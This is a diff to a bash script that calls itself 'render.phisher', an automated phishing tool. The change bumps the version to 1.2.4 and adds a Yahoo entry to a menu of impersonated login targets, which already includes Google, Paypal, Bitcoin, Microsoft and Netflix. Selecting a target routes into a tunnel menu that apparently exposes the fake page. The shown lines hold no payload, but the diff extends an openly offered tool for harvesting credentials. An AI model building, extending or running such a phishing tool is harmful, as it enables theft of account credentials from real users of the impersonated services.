@@ -2,7 +2,7 @@
 
 ##   render.phisher : 	Simple Automated Phishing Tool
 ##   Author 		: 	render437
-##   Version 		: 	1.2.3
+##   Version 		: 	1.2.4
 ##   Github 		: 	https://github.com/render437/render.phisher
 
 
@@ -79,7 +79,7 @@
 ##      Copyright (C) 2025  RENDER437 (https://github.com/render437)
 
 
-__version__="1.2.3"
+__version__="1.2.4"
 
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
@@ -909,7 +909,7 @@ main_menu() {
 		 ${WHITE}| ${BRIGHT_BLACK}04. ${BRIGHT_CYAN}Instagram    ${WHITE}| ${BRIGHT_BLACK}14. ${BRIGHT_CYAN}Github       ${WHITE}| ${BRIGHT_BLACK}24. ${BRIGHT_CYAN}Xbox         ${WHITE}|
 		 ${WHITE}| ${BRIGHT_BLACK}05. ${BRIGHT_CYAN}Google       ${WHITE}| ${BRIGHT_BLACK}15. ${BRIGHT_CYAN}Shopify      ${WHITE}| ${BRIGHT_BLACK}25. ${BRIGHT_CYAN}Verizon      ${WHITE}|
 		 ${WHITE}| ${BRIGHT_BLACK}06. ${BRIGHT_CYAN}Bitcoin      ${WHITE}| ${BRIGHT_BLACK}16. ${BRIGHT_CYAN}Ebay         ${WHITE}| ${BRIGHT_BLACK}26. ${BRIGHT_CYAN}Wifi         ${WHITE}|
-		 ${WHITE}| ${BRIGHT_BLACK}07. ${BRIGHT_CYAN}Crypto       ${WHITE}| ${BRIGHT_BLACK}17. ${BRIGHT_CYAN}Pinterest    ${WHITE}|                  |
+		 ${WHITE}| ${BRIGHT_BLACK}07. ${BRIGHT_CYAN}Crypto       ${WHITE}| ${BRIGHT_BLACK}17. ${BRIGHT_CYAN}Pinterest    ${WHITE}| ${BRIGHT_BLACK}27. ${BRIGHT_CYAN}Yahoo        ${WHITE}|
 		 ${WHITE}| ${BRIGHT_BLACK}08. ${BRIGHT_CYAN}Microsoft    ${WHITE}| ${BRIGHT_BLACK}18. ${BRIGHT_CYAN}Discord      ${WHITE}|                  |
 		 ${WHITE}| ${BRIGHT_BLACK}09. ${BRIGHT_CYAN}Netflix      ${WHITE}| ${BRIGHT_BLACK}19. ${BRIGHT_CYAN}Reddit       ${WHITE}|                  |
 		 ${WHITE}| ${BRIGHT_BLACK}10. ${BRIGHT_CYAN}Paypal       ${WHITE}| ${BRIGHT_BLACK}20. ${BRIGHT_CYAN}Messenger    ${WHITE}|                  |
@@ -1015,6 +1015,9 @@ main_menu() {
 			tunnel_menu;;
 		26)
 			website="wifi"
+			tunnel_menu;;
+		27)
+			website="yahoo"
 			tunnel_menu;;
 		99)
 			about;;
